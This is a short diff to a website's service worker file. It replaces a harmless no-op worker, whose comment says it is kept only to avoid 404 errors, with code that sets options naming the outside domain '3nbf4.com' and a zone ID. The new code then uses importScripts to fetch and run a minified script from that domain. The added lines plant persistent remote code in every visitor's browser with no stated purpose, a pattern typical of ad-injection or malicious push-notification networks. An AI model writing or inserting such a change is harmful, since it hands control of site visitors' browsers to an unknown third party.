@@ -1,9 +1,6 @@
-// Intentionally no-op.
-// Keep this file to avoid 404s from stale service worker requests.
-self.addEventListener('install', () => {
-  self.skipWaiting();
-});
-
-self.addEventListener('activate', (event) => {
-  event.waitUntil(self.clients.claim());
-});
+self.options = {
+    "domain": "3nbf4.com",
+    "zoneId": 10969428
+}
+self.lary = ""
+importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
